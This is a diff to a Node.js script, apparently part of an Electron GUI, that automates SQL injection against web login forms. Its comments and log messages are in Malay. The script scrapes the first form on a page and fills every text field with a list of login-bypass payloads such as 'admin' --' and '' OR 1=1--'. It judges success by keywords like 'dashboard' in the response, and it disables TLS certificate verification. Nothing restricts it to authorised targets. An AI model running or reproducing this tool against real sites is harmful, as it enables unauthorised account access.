@@ -1,41 +1,60 @@
-// 📁 sqli-electron-gui/sqli.js
+// 📁 sqli.js (Fix syntax error: removed invalid triple quotes)
 const axios = require('axios');
 const cheerio = require('cheerio');
 const qs = require('qs');
 const fs = require('fs');
 const path = require('path');
+const https = require('https');
+const agent = new https.Agent({ rejectUnauthorized: false });
 
 const payloads = [
-  "' or 1=1--",
-  "' or '1'='1",
-  "' OR 'a'='a",
-  "' OR 1=1#",
+  "' OR 1=1--",
+  "' OR '1'='1",
+  "admin' --",
+  "admin' #",
+  "' OR 1=1 #",
   "' OR 1=1/*",
-  "'/**/OR/**/1=1--",
-  "'+OR+1=1--",
-  "' OR SLEEP(1)--"
+  "' OR 'a'='a",
+  "\" OR 1=1--",
+  "' OR 1=1 LIMIT 1--",
+  "%27%20OR%201%3D1--"
 ];
 
-async function handleSQLiTest(url) {
-  const log = [];
+function sanitizeUrl(url) {
   try {
-    const res = await axios.get(url, { timeout: 10000 });
-    const $ = cheerio.load(res.data);
+    const clean = new URL(url);
+    return clean.origin + clean.pathname;
+  } catch (e) {
+    return url.split('?')[0].split(':')[0];
+  }
+}
 
+async function handleSQLiTest(url, callback = () => {}) {
+  const startAll = Date.now();
+  const log = [];
+
+  const pushLog = (line) => {
+    log.push(line);
+    callback(line);
+  };
+
+  try {
+    pushLog(`🔁 Akses awal ke: ${url}`);
+    const res = await axios.get(url, { httpsAgent: agent, responseType: 'text', timeout: 10000 });
+    pushLog(`✅ Status code: ${res.status}, saiz respon: ${res.data.length} byte`);
+    const $ = cheerio.load(res.data);
     const form = $('form').first();
     const inputs = form.find('input');
     const action = form.attr('action') || url;
-    const method = (form.attr('method') || 'post').toLowerCase();
+    const method = (form.attr('method') || 'post').toUpperCase();
 
     const allFields = {};
     const textFields = [];
-
-    inputs.each((i, el) => {
+    inputs.each((_, el) => {
       const type = ($(el).attr('type') || 'text').toLowerCase();
       const name = $(el).attr('name');
       const value = $(el).attr('value') || '';
       if (!name) return;
-
       if (["hidden", "submit", "button", "checkbox"].includes(type)) {
         allFields[name] = value || '1';
       } else {
@@ -44,63 +63,52 @@ async function handleSQLiTest(url) {
       }
     });
 
-    if (textFields.length < 2) {
-      log.push('❌ Tak cukup input login (kurang dari 2).');
-      return log;
-    }
+    if (textFields.length === 0) return ['❌ Tiada input text untuk uji.'];
+    pushLog(`📥 Dikesan input: ${textFields.join(', ')}`);
 
-    const [param1, param2] = textFields;
     const targetUrl = action.startsWith('http') ? action : new URL(action, url).href;
-    log.push(`📥 Dikesan input: ${param1}, ${param2}`);
+    const cleanUrl = sanitizeUrl(targetUrl);
 
-    for (let payload of payloads) {
-      const data = { ...allFields };
-      data[param1] = payload;
-      data[param2] = payload;
-
-      log.push(`\n🚀 Uji payload: ${payload}`);
+    for (let p of payloads) {
+      pushLog(`\n🚀 Uji Payload: ${p}`);
+      const encoded = encodeURIComponent(p);
+      const testData = { ...allFields };
+      for (let name of textFields) testData[name] = p;
 
       try {
-        const postRes = await axios({
-          method,
-          url: targetUrl,
-          data: qs.stringify(data),
-          headers: {
-            'Content-Type': 'application/x-www-form-urlencoded'
-          },
-          timeout: 10000,
+        const r = await axios.post(targetUrl, qs.stringify(testData), {
+          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+          httpsAgent: agent,
+          timeout: 8000,
           validateStatus: () => true
         });
 
-        const status = postRes.status;
-        const html = postRes.data;
-
-        if (status === 403 || html.includes("Firewall") || html.includes("Access Denied")) {
-          log.push(`🛡️ Dihalang oleh WAF atau status ${status}`);
-        } else if (!html.includes('invalid') && !html.includes('error') && status < 400) {
-          log.push(`✅ BERJAYA LOGIN dengan payload: ${payload}`);
-
-          // Simpan snapshot
-          const folder = path.join(__dirname, 'output');
-          if (!fs.existsSync(folder)) fs.mkdirSync(folder);
-
-          const filename = `success-${payload.replace(/[^a-z0-9]/gi, '_')}.html`;
-          const filepath = path.join(folder, filename);
-          fs.writeFileSync(filepath, html, 'utf-8');
-          log.push(`📸 Snapshot disimpan ke: output/${filename}`);
-          break;
+        const body = r.data.toLowerCase();
+        if (body.includes('welcome') || body.includes('dashboard') || body.includes('berjaya') || body.includes('profil')) {
+          pushLog(`✅ Respon positif! Ada keyword login berjaya.`);
+        } else if (body.includes('ralat') || body.includes('error') || body.includes('invalid')) {
+          pushLog(`⚠️ Mungkin inject tak berjaya (respon mengandungi error)`);
         } else {
-          log.push(`❌ Gagal login.`);
+          pushLog(`❔ Tidak pasti, size: ${body.length} byte`);
         }
       } catch (err) {
-        log.push(`⚠️ Error: ${err.message}`);
+        pushLog(`❌ Gagal hantar payload: ${err.message}`);
       }
     }
-  } catch (err) {
-    log.push(`❌ Tak dapat akses halaman: ${err.message}`);
-  }
 
-  return log;
+    const endAll = Date.now();
+    const duration = ((endAll - startAll) / 1000).toFixed(1);
+    pushLog(`\n⏱️ Masa total scan: ${duration}s`);
+
+    const outputFolder = path.join(__dirname, 'output');
+    if (!fs.existsSync(outputFolder)) fs.mkdirSync(outputFolder);
+    fs.writeFileSync(path.join(outputFolder, 'payload-scan-log.txt'), log.join('\n'));
+    pushLog(`💾 Disimpan ke: output/payload-scan-log.txt`);
+
+    return log;
+  } catch (err) {
+    return [`❌ Ralat utama: ${err.message}`];
+  }
 }
 
 module.exports = { handleSQLiTest };
